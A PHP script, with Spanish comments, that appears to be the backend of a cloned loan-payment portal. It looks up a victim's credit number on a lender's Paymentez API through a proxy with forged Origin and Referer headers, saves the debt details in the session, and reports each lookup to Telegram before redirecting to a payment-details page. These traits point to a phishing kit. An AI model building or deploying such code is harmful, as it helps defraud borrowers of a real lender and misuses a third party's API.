<?php

session_start();

require_once __DIR__ . '/includes/telegram-logger.php';

header('Content-Type: application/json; charset=utf-8');


/*
|--------------------------------------------------------------------------
| CONFIGURACIÓN
|--------------------------------------------------------------------------
*/

define(
    'API_URL',
    'https://t3a9z73ceg.execute-api.us-east-1.amazonaws.com/prod/paymentez/1111111/oracle/get-user-info'
);

define('PROXY_HOST', getenv('PROXY_HOST') ?: '');
define('PROXY_PORT', (int)(getenv('PROXY_PORT') ?: 0));
define('PROXY_USER', getenv('PROXY_USER') ?: '');
define('PROXY_PASS', getenv('PROXY_PASS') ?: '');

/*
 * true  = usar proxy
 * false = no usar proxy
 */
define('USE_PROXY', true);


/*
|--------------------------------------------------------------------------
| LOG A TXT
|--------------------------------------------------------------------------
*/

function writeApiDebugLog(string $message, array $context = []): void
{
    $logDir = __DIR__ . '/logs';

    if (!is_dir($logDir)) {
        @mkdir($logDir, 0775, true);
    }

    $logFile = $logDir . '/api-debug.txt';

    $timestamp = date('Y-m-d H:i:s');

    $lines = [];

    $lines[] = '';
    $lines[] = '============================================================';
    $lines[] = '[' . $timestamp . '] ' . $message;

    foreach ($context as $key => $value) {

        if (is_array($value)) {
            $value = json_encode(
                $value,
                JSON_UNESCAPED_UNICODE |
                JSON_UNESCAPED_SLASHES |
                JSON_PRETTY_PRINT
            );
        }

        $lines[] = $key . ': ' . $value;
    }

    $lines[] = '============================================================';

    @file_put_contents(
        $logFile,
        implode(PHP_EOL, $lines) . PHP_EOL,
        FILE_APPEND | LOCK_EX
    );
}


/*
|--------------------------------------------------------------------------
| TELEGRAM
|--------------------------------------------------------------------------
*/

function logTelegram($action, $data = [])
{
    if (function_exists('telegram_log')) {
        telegram_log($action, $data);
    }
}


/*
|--------------------------------------------------------------------------
| INFORMACIÓN DEL SERVIDOR
|--------------------------------------------------------------------------
*/

writeApiDebugLog('INICIO DE PETICIÓN', [

    'php_version' => PHP_VERSION,

    'server_software' =>
        $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',

    'request_method' =>
        $_SERVER['REQUEST_METHOD'] ?? 'unknown',

    'request_uri' =>
        $_SERVER['REQUEST_URI'] ?? 'unknown',

    'api_url' => API_URL,

    'api_host' =>
        parse_url(API_URL, PHP_URL_HOST),

    'proxy_enabled' =>
        USE_PROXY ? 'SI' : 'NO',

    'proxy_host' =>
        PROXY_HOST ?: 'NO CONFIGURADO',

    'proxy_port' =>
        PROXY_PORT ?: 'NO CONFIGURADO',

    'proxy_user_configured' =>
        PROXY_USER !== '' ? 'SI' : 'NO',

    'proxy_password_configured' =>
        PROXY_PASS !== '' ? 'SI' : 'NO',

]);


/*
|--------------------------------------------------------------------------
| VALIDAR MÉTODO
|--------------------------------------------------------------------------
*/

if (
    ($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST' ||
    empty($_POST['creditNumber'])
) {

    writeApiDebugLog('PETICIÓN ENTRANTE INVÁLIDA', [

        'method' =>
            $_SERVER['REQUEST_METHOD'] ?? 'unknown',

        'post_keys' =>
            array_keys($_POST),

        'has_creditNumber' =>
            !empty($_POST['creditNumber'])
                ? 'SI'
                : 'NO',

    ]);

    http_response_code(400);

    echo json_encode([
        'success' => false,
        'message' =>
            'Debes ingresar el número de crédito.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| CREDIT NUMBER
|--------------------------------------------------------------------------
*/

$creditNumber = trim($_POST['creditNumber']);


/*
|--------------------------------------------------------------------------
| VALIDAR CREDIT NUMBER
|--------------------------------------------------------------------------
*/

if (
    !preg_match(
        '/^[A-Za-z0-9\-]{1,30}$/',
        $creditNumber
    )
) {

    writeApiDebugLog('CREDIT NUMBER INVÁLIDO', [

        'length' =>
            strlen($creditNumber),

    ]);

    http_response_code(422);

    echo json_encode([
        'success' => false,
        'message' =>
            'El número de crédito ingresado no es válido.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| PAYLOAD
|--------------------------------------------------------------------------
*/

$payloadArray = [

    'creditNumber' => $creditNumber,

    'forceRequest' => true,

    'chanel' => 'test',

];

$payload = json_encode(
    $payloadArray,
    JSON_UNESCAPED_UNICODE |
    JSON_UNESCAPED_SLASHES
);


if ($payload === false) {

    writeApiDebugLog('ERROR CREANDO PAYLOAD', [

        'json_error' =>
            json_last_error_msg(),

    ]);

    http_response_code(500);

    echo json_encode([
        'success' => false,
        'message' =>
            'Error preparando la petición.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| LOG PAYLOAD
|--------------------------------------------------------------------------
|
| No guardamos el creditNumber completo.
|--------------------------------------------------------------------------
*/

writeApiDebugLog('PAYLOAD PREPARADO', [

    'payload_length' =>
        strlen($payload),

    'payload_fields' =>
        array_keys($payloadArray),

]);


/*
|--------------------------------------------------------------------------
| CURL EXISTE?
|--------------------------------------------------------------------------
*/

if (!function_exists('curl_init')) {

    writeApiDebugLog(
        'ERROR CRÍTICO: CURL NO ESTÁ INSTALADO'
    );

    http_response_code(500);

    echo json_encode([
        'success' => false,
        'message' =>
            'cURL no está disponible en el servidor.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| CREAR CURL
|--------------------------------------------------------------------------
*/

$ch = curl_init();


/*
|--------------------------------------------------------------------------
| OPCIONES CURL
|--------------------------------------------------------------------------
*/

curl_setopt_array($ch, [

    CURLOPT_URL =>
        API_URL,

    CURLOPT_RETURNTRANSFER =>
        true,

    CURLOPT_POST =>
        true,

    CURLOPT_POSTFIELDS =>
        $payload,

    CURLOPT_HTTPHEADER => [

        'Content-Type: application/json',

        'Accept: application/json',

        'Origin: https://www.mobilize-fs.com.co',

        'Referer: https://www.mobilize-fs.com.co/portal-pagos/',

        'User-Agent: Mozilla/5.0',

    ],

    CURLOPT_TIMEOUT =>
        30,

    CURLOPT_CONNECTTIMEOUT =>
        15,

    /*
     * IPv4.
     */
    CURLOPT_IPRESOLVE =>
        CURL_IPRESOLVE_V4,

    /*
     * Seguir redirects.
     */
    CURLOPT_FOLLOWLOCATION =>
        true,

    CURLOPT_MAXREDIRS =>
        5,

    /*
     * Obtener headers.
     */
    CURLOPT_HEADER =>
        true,

]);


/*
|--------------------------------------------------------------------------
| PROXY
|--------------------------------------------------------------------------
*/

if (USE_PROXY) {

    if (
        PROXY_HOST === '' ||
        PROXY_PORT <= 0
    ) {

        writeApiDebugLog(
            'ERROR: PROXY HABILITADO PERO NO CONFIGURADO'
        );

        http_response_code(500);

        echo json_encode([
            'success' => false,
            'message' =>
                'El proxy no está configurado correctamente.'
        ]);

        exit;
    }


    curl_setopt(
        $ch,
        CURLOPT_PROXY,
        PROXY_HOST
    );

    curl_setopt(
        $ch,
        CURLOPT_PROXYPORT,
        PROXY_PORT
    );

    /*
     * Proxy HTTP.
     */
    curl_setopt(
        $ch,
        CURLOPT_PROXYTYPE,
        CURLPROXY_HTTP
    );


    /*
     * Autenticación.
     */
    if (
        PROXY_USER !== '' &&
        PROXY_PASS !== ''
    ) {

        curl_setopt(
            $ch,
            CURLOPT_PROXYUSERPWD,
            PROXY_USER . ':' . PROXY_PASS
        );

        writeApiDebugLog(
            'PROXY CONFIGURADO',
            [

                'host' =>
                    PROXY_HOST,

                'port' =>
                    PROXY_PORT,

                'type' =>
                    'HTTP',

                'authentication' =>
                    'SI',

            ]
        );

    } else {

        writeApiDebugLog(
            'PROXY CONFIGURADO SIN AUTENTICACIÓN',
            [

                'host' =>
                    PROXY_HOST,

                'port' =>
                    PROXY_PORT,

            ]
        );
    }

} else {

    writeApiDebugLog(
        'PETICIÓN SIN PROXY'
    );
}


/*
|--------------------------------------------------------------------------
| EJECUTAR
|--------------------------------------------------------------------------
*/

$startTime = microtime(true);

$response = curl_exec($ch);

$duration = round(
    (microtime(true) - $startTime) * 1000,
    2
);


/*
|--------------------------------------------------------------------------
| ERROR CURL
|--------------------------------------------------------------------------
*/

$errno =
    curl_errno($ch);

$error =
    curl_error($ch);


/*
|--------------------------------------------------------------------------
| INFORMACIÓN CURL
|--------------------------------------------------------------------------
*/

$info =
    curl_getinfo($ch);


/*
|--------------------------------------------------------------------------
| HTTP CODE
|--------------------------------------------------------------------------
*/

$httpCode =
    (int)($info['http_code'] ?? 0);


/*
|--------------------------------------------------------------------------
| SEPARAR HEADERS Y BODY
|--------------------------------------------------------------------------
*/

$headerSize =
    (int)($info['header_size'] ?? 0);

$responseHeaders = '';

$responseBody = '';

if ($response !== false) {

    $responseHeaders =
        substr(
            $response,
            0,
            $headerSize
        );

    $responseBody =
        substr(
            $response,
            $headerSize
        );
}


/*
|--------------------------------------------------------------------------
| LOG CURL COMPLETO
|--------------------------------------------------------------------------
*/

writeApiDebugLog('CURL TERMINÓ', [

    'duration_ms' =>
        $duration,

    'curl_errno' =>
        $errno,

    'curl_error' =>
        $error ?: 'NINGUNO',

    'curl_error_description' =>
        $errno && function_exists('curl_strerror')
            ? curl_strerror($errno)
            : 'NINGUNO',

    'http_code' =>
        $httpCode,

    'response_total_size' =>
        $response !== false
            ? strlen($response)
            : 0,

    'response_body_size' =>
        strlen($responseBody),

    'namelookup_time' =>
        $info['namelookup_time'] ?? null,

    'connect_time' =>
        $info['connect_time'] ?? null,

    'pretransfer_time' =>
        $info['pretransfer_time'] ?? null,

    'starttransfer_time' =>
        $info['starttransfer_time'] ?? null,

    'total_time' =>
        $info['total_time'] ?? null,

    'primary_ip' =>
        $info['primary_ip'] ?? null,

    'local_ip' =>
        $info['local_ip'] ?? null,

    'primary_port' =>
        $info['primary_port'] ?? null,

    'local_port' =>
        $info['local_port'] ?? null,

    'redirect_count' =>
        $info['redirect_count'] ?? null,

    'redirect_url' =>
        $info['redirect_url'] ?? null,

    'content_type' =>
        $info['content_type'] ?? null,

]);


/*
|--------------------------------------------------------------------------
| LOG HEADERS DE RESPUESTA
|--------------------------------------------------------------------------
*/

writeApiDebugLog(
    'HEADERS DE RESPUESTA',
    [
        'headers' =>
            substr(
                $responseHeaders,
                0,
                5000
            )
    ]
);


/*
|--------------------------------------------------------------------------
| LOG BODY DE RESPUESTA
|--------------------------------------------------------------------------
*/

writeApiDebugLog(
    'BODY DE RESPUESTA',
    [

        'body' =>
            substr(
                $responseBody,
                0,
                2000
            )

    ]
);


/*
|--------------------------------------------------------------------------
| CERRAR CURL
|--------------------------------------------------------------------------
*/

curl_close($ch);


/*
|--------------------------------------------------------------------------
| ERROR DE CONEXIÓN
|--------------------------------------------------------------------------
*/

if (
    $errno ||
    $response === false
) {

    writeApiDebugLog(
        'ERROR DE CONEXIÓN',
        [

            'curl_errno' =>
                $errno,

            'curl_error' =>
                $error,

            'http_code' =>
                $httpCode,

        ]
    );


    logTelegram(
        '❌ Error de conexión con API',
        [

            'Error cURL' =>
                $error ?: 'Desconocido',

            'HTTP Code' =>
                $httpCode,

        ]
    );


    http_response_code(502);

    echo json_encode([
        'success' => false,
        'message' =>
            'Error de conexión con el servicio.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| 405
|--------------------------------------------------------------------------
*/

if ($httpCode === 405) {

    writeApiDebugLog(
        '⚠️ HTTP 405 METHOD NOT ALLOWED',
        [

            'message' =>
                'El servidor recibió la petición pero no permite este método HTTP.',

            'request_method' =>
                'POST',

            'api_url' =>
                API_URL,

            'response_headers' =>
                substr(
                    $responseHeaders,
                    0,
                    3000
                ),

            'response_body' =>
                substr(
                    $responseBody,
                    0,
                    3000
                ),

        ]
    );


    http_response_code(502);

    echo json_encode([
        'success' => false,
        'message' =>
            'La API rechazó el método HTTP utilizado.',
        'debug_http_code' =>
            405
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| HTTP NO EXITOSO
|--------------------------------------------------------------------------
*/

if (
    $httpCode < 200 ||
    $httpCode >= 300
) {

    writeApiDebugLog(
        'HTTP NO EXITOSO',
        [

            'http_code' =>
                $httpCode,

            'response_body' =>
                substr(
                    $responseBody,
                    0,
                    2000
                ),

        ]
    );
}


/*
|--------------------------------------------------------------------------
| JSON
|--------------------------------------------------------------------------
*/

$data =
    json_decode(
        $responseBody,
        true
    );

$jsonError =
    json_last_error_msg();


if (
    $data === null &&
    $jsonError !== 'No error'
) {

    writeApiDebugLog(
        'RESPUESTA NO ES JSON',
        [

            'json_error' =>
                $jsonError,

            'body' =>
                substr(
                    $responseBody,
                    0,
                    2000
                ),

        ]
    );


    http_response_code(502);

    echo json_encode([
        'success' => false,
        'message' =>
            'La respuesta del servicio no es válida.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| USER INFO
|--------------------------------------------------------------------------
*/

if (
    isset($data['userInfo']) &&
    is_array($data['userInfo'])
) {

    $userInfo =
        $data['userInfo'];


    $concept =
        $data['paymentDescription']
        ?? 'Pago credito RCI';


    $minPayment =
        $userInfo['PAGO_MINIMO']
        ?? null;


    $totalDebt =
        $userInfo['PAGO_TOTAL']
        ?? null;


    $dueDate =
        $userInfo['FECHA_VENCIMIENTO_PAGO']
        ?? null;


    $valueToPay =
        $minPayment;


    /*
     * Guardar sesión.
     */

    $_SESSION['userInfo'] =
        $userInfo;

    $_SESSION['creditNumber'] =
        $creditNumber;

    $_SESSION['payment'] = [

        'concept' =>
            $concept,

        'minPayment' =>
            $minPayment,

        'totalDebt' =>
            $totalDebt,

        'dueDate' =>
            $dueDate,

        'valueToPay' =>
            $valueToPay,

    ];


    writeApiDebugLog(
        '✅ API RESPONDIÓ CORRECTAMENTE',
        [

            'http_code' =>
                $httpCode,

            'has_userInfo' =>
                'SI',

            'response_size' =>
                strlen($responseBody),

        ]
    );


    logTelegram(
        '✅ Crédito encontrado',
        [

            'Pago mínimo' =>
                $minPayment,

            'Deuda total' =>
                $totalDebt,

            'Vencimiento' =>
                $dueDate,

        ]
    );


    echo json_encode([
        'success' => true,
        'redirect' =>
            'detalle-pago.php'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| NO USER INFO
|--------------------------------------------------------------------------
*/

writeApiDebugLog(
    '⚠️ API RESPONDIÓ SIN USERINFO',
    [

        'http_code' =>
            $httpCode,

        'message' =>
            $data['message']
            ?? 'Sin mensaje',

        'response_body' =>
            substr(
                $responseBody,
                0,
                2000
            ),

    ]
);


logTelegram(
    '⚠️ Crédito no encontrado',
    []
);


http_response_code(404);

echo json_encode([
    'success' => false,
    'message' =>
        'No encontramos información asociada a ese número de crédito.'
]);

exit;
